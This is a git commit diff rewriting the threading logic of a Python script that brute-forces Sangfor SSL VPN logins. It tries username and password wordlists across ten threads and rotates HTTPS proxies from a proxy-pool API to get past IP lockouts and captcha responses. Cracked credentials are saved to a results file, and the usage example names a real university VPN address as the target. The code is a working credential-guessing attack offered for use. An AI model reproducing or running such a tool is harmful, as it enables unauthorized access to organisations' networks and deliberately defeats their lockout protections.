5e3bd0440203d320be85bf3ca0a8f3a4054f3a4e
Libraggbond <37012218+Libraggbond@users.noreply.github.com>
2019-09-29 22:02:42 +0800

    Update SanforSSLVPNbrute.py
    完全重写了多线程的逻辑

--- SanforSSLVPNbrute.py
+++ SanforSSLVPNbrute.py
@@ -7,11 +7,11 @@ import sys
 import os
 import re
  
-sys.setrecursionlimit(10000) #修改默认递归次数 
+sys.setrecursionlimit(10000) #修改默认递归次数限制
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
-class myThread(threading.Thread): #重写线程子类
+class myThread(threading.Thread):	#派生线程子类，主要是为了实现获取线程返回值
 
 	def __init__(self,target,args):
 		threading.Thread.__init__(self)
@@ -23,32 +23,25 @@ class myThread(threading.Thread): #重写线程子类
 
 		self.result = self.target(*self.args)
 		
-	def get_result(self):  #添加获取返回值的方法，虽然没用上
+	def get_result(self):	#并没有用到，目的是获取线程的返回值
 		try:
 			return self.result 
 		except Exception as e:
 			print(e)
 
 
-def get_proxy():
-    return requests.get("http://{}:5010/get/".format(proxyapi)).json() #需配合https代理地址池
-
-def get_result(self):
-	try:
-		return self.result 
-	except Exception:
-		return None
-
+def get_proxy():	#调用api获取一个https代理
+    return requests.get("http://{}:5010/get/".format(proxyapi)).json()
 
 def exploit(user,dic):
 	try:
 		data = {"svpn_name":"{}".format(user),"svpn_password":"{}".format(dic),"svpn_rand_code":""}
 		proxy = get_proxy().get("proxy")
 		proxies = "https://{}".format(proxy)
-		response = requests.post(url,data,proxies={"https":proxies},verify=False,timeout=10)
+		response = requests.post(url,data,proxies={"https":proxies},verify=False,timeout=5)
 		verify = re.match(r'.*<Note>(.*?)</Note>',response.text).group(1)
 		if verify:
-			if len(verify) == 12:
+			if len(verify) == 12:	#密码正确
 				print ("\033[0;32;40m"+user,dic+ " :Done\033[0m")
 				return user,dic
 			 	
@@ -56,13 +49,13 @@ def exploit(user,dic):
 				print(user,dic+" :WRONG password")
 				return "wrong"
 
-			elif len(verify) == 31:
+			elif len(verify) == 31:	#IP锁定
 				print(user,dic+" :IP locked")
-				r = exploit(user,dic)	#IP锁了就换一个代理递归重试一次
+				r = exploit(user,dic)	#递归换代理重试
 				return r
-			else:
+			else:	#启用验证码的情况
 				print(user,dic+" :SOMETHING wrong")
-				r = exploit(user,dic)	#可能是验证码过期或是出现验证码的情况，递归重试
+				r = exploit(user,dic)	#递归换代理重试
 				return r
 		else:
 		 	print(user,dic+" :RESPONSE error")
@@ -74,64 +67,67 @@ def exploit(user,dic):
 		print(user,dic+" :Proxy error")
 		#if _FINISH == False:
 		try:
-			requests.get("http://{}:5010/delete/?proxy={}".format(proxyapi,proxy)) #代理失效从地址池删除掉
+
+			requests.get("http://{}:5010/delete/?proxy={}".format(proxyapi,proxy))	#删除不好用的代理ip
 			r = exploit(user,dic)
 			return r
 		except Exception as e:
 			pass
 		
-def brute(i,user,pass_queue):
+def brute(i,user_queue,passdic):
 	#global _FINISH
 	print ("I'm thread" + str(i))
-	
-		#print(pass_queue.get())
-		#os._exit(0)
-	while not pass_queue.empty():
-		passwd = pass_queue.get()
+	for passwd in passdic:
+		#print (passwd)
+		while not user_queue.empty():
 
-		result = exploit(user,passwd.strip())
-		if result:
+			user = user_queue.get()
+			result = exploit(user,passwd.strip())
+			if result:
 
-			if result == "wrong":			
-				pass
+				if result == "wrong":	#密码错误就换下一个			
+					pass
+				else:
+					with open('result.txt','a+',encoding='utf-8') as f:
+						f.write(result[0]+" : "+result[1] + "\r\n")
+					#pass_queue.queue.clear()
+					#break
 			else:
-				with open('result.txt','a+',encoding='utf-8') as f:
-					f.write(result[0]+" : "+result[1] + "\r\n")
-				pass_queue.queue.clear()
-				break
-		else:
-			pass
+				pass
+		with open(userdic,'r',encoding='utf-8') as users:
+			for user in users:
+				user_queue.put(user.strip())
 				        
 if __name__ =='__main__':
-“”“
-python sanforbrute_t.py https://sslvpn地址 user.txt pass.txt 127.0.0.1
-”“”
+
+	"""
+	python sanforbrute_t.py https://svpn.sdust.edu.cn:4433 user.txt pass.txt 127.0.0.1
+
+	"""
+
 	url = sys.argv[1]+"/por/login_psw.csp?type=cs&language=zh_CN&encrypt=0"
-	userdic = sys.argv[2]
-	passdic = sys.argv[3]
-	proxyapi = sys.argv[4]
+	userdic = sys.argv[2]	#用户字典
+	passdic = sys.argv[3]	#密码字典
+	proxyapi = sys.argv[4]	#代理地址池地址
 	#dic_queue = queue.Queue()
 
 	n = 10 # threading 数量
 	mythread = []
-	with open(userdic,'r',encoding='utf-8') as users:  #用户字典
+	passfile = open(passdic,'r',encoding='utf-8')
+	user_queue = queue.Queue()
+	with open(userdic,'r',encoding='utf-8') as users:
 		for user in users:
-			pass_queue = queue.Queue()
-			with open(passdic,'r',encoding='utf-8') as pwds: #密码字典
+			user_queue.put(user.strip())
+		
+	for i in range(n):
 
-				for pwd in pwds:
-					pass_queue.put(pwd)
-	
-			for i in range(n):
-				t = myThread(target=brute,args=(i,user.strip(),pass_queue))			
-				t.setDaemon(True)
-				mythread.append(t)
-			
-		for t in mythread:				
-		 	t.start()
+		#username = user_queue.get()
+		t = myThread(target=brute,args=(i,user_queue,passfile))
+		t.setDaemon(True)
+		mythread.append(t)
 
-		for t in mythread:
-		 	t.join()
+	for t in mythread:
+		t.start()
 
-
-	
+	for t in mythread:
+		t.join()
